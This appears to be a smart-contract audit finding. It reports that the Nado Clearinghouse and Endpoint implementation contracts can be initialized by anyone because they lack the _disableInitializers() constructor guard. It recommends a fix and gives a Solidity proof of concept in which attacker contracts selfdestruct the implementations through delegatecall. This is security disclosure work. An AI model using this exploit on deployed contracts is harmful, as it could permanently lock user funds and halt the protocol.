### Title
Uninitialized `Clearinghouse` and `Endpoint` Implementation Contracts Allow Attacker to `selfdestruct` Implementations via `delegatecall` — (`core/contracts/Clearinghouse.sol`, `core/contracts/Endpoint.sol`)

---

### Summary
`Clearinghouse` and `Endpoint` are upgradeable proxy implementations that omit the `_disableInitializers()` constructor guard present in every other upgradeable contract in the system. Their implementation contracts can be initialized by any caller. Both contracts contain `delegatecall` paths that, once the attacker controls the implementation's owner-settable target address, can be used to `selfdestruct` the implementation and permanently brick all proxies pointing to it.

---

### Finding Description

Five upgradeable contracts in the Nado system correctly protect their implementation contracts by calling `_disableInitializers()` in a constructor:

- `BaseProxyManager` [1](#0-0) 
- `ContractOwner` [2](#0-1) 
- `Verifier` [3](#0-2) 
- `Airdrop` [4](#0-3) 
- `BaseWithdrawPool` [5](#0-4) 

`Clearinghouse` and `Endpoint` define no such constructor. Their `initialize()` functions carry only the `initializer` modifier, which guards the proxy's storage slot — not the implementation contract's own storage. The implementation's `_initialized` slot remains `0` after deployment, so any caller can invoke `initialize()` directly on the implementation address.

**`Clearinghouse.initialize`** — no constructor, no `_disableInitializers()`: [6](#0-5) 

**`Endpoint.initialize`** — no constructor, no `_disableInitializers()`: [7](#0-6) 

Once an attacker initializes the implementation, they become `owner` and can set the `delegatecall` target to a malicious contract.

**`Clearinghouse` `delegatecall` path** — `liquidateSubaccount` delegates to `clearinghouseLiq`, which is set during `initialize` and updatable by `owner`: [8](#0-7) 

**`Endpoint` `delegatecall` path** — `_delegatecallEndpointTx` delegates to `endpointTx`, set during `initialize`: [9](#0-8) 

---

### Impact Explanation

An attacker who `selfdestruct`s the `Clearinghouse` or `Endpoint` implementation contract causes every proxy pointing to that implementation to become permanently non-functional. All user funds held in the `Clearinghouse` (collateral, insurance) become permanently inaccessible. All sequencer transaction submission, deposit, withdrawal, and liquidation flows through `Endpoint` are permanently halted. There is no recovery path without a proxy upgrade, which itself requires the `ProxyManager` — a contract that depends on the `Clearinghouse` and `Endpoint` proxies being functional.

---

### Likelihood Explanation

The implementation contract addresses are publicly discoverable from on-chain proxy admin storage. The attack requires no special privileges, no sequencer access, and no capital. The window is open from the moment the implementation is deployed until the proxy is initialized — but even after proxy initialization, the implementation's own `_initialized` slot remains `0`, so the attack remains viable indefinitely. The only prerequisite is knowing the implementation address.

---

### Recommendation

Add a constructor calling `_disableInitializers()` to both `Clearinghouse` and `Endpoint`, matching the pattern already used by `BaseProxyManager`, `ContractOwner`, `Verifier`, `Airdrop`, and `BaseWithdrawPool`:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

This sets `_initialized = type(uint8).max` in the implementation's own storage at deploy time, making any subsequent call to `initialize()` on the implementation revert unconditionally.

---

### Proof of Concept

**For `Clearinghouse`:**

```solidity
// MaliciousLiq.sol
contract MaliciousLiq {
    function liquidateSubaccountImpl(...) external {
        selfdestruct(payable(msg.sender));
    }
}

// Attack
MaliciousLiq mal = new MaliciousLiq();

// Step 1: Initialize the Clearinghouse *implementation* directly
Clearinghouse impl = Clearinghouse(CLEARINGHOUSE_IMPL_ADDRESS);
impl.initialize(
    address(fakeEndpoint),
    address(fakeQuote),
    address(mal),   // attacker-controlled clearinghouseLiq
    0,
    address(fakeWithdrawPool)
);

// Step 2: Trigger delegatecall → selfdestruct on the implementation
IEndpoint.LiquidateSubaccount memory txn = ...;
impl.liquidateSubaccount(txn); // delegatecalls mal → selfdestruct(impl)
// Clearinghouse implementation is now destroyed; all proxies are bricked
```

**For `Endpoint`:**

```solidity
// MaliciousEndpointTx.sol
contract MaliciousEndpointTx {
    fallback() external {
        selfdestruct(payable(msg.sender));
    }
}

// Attack
MaliciousEndpointTx malTx = new MaliciousEndpointTx();

Endpoint impl = Endpoint(ENDPOINT_IMPL_ADDRESS);
impl.initialize(
    address(0), address(0), address(0),
    IClearinghouse(address(fakeClearinghouse)),
    address(0),
    address(malTx)  // attacker-controlled endpointTx
);

// Any call that routes through _delegatecallEndpointTx destroys the implementation
impl.submitSlowModeTransaction(bytes(""));
// Endpoint implementation is now destroyed; all proxies are bricked
```
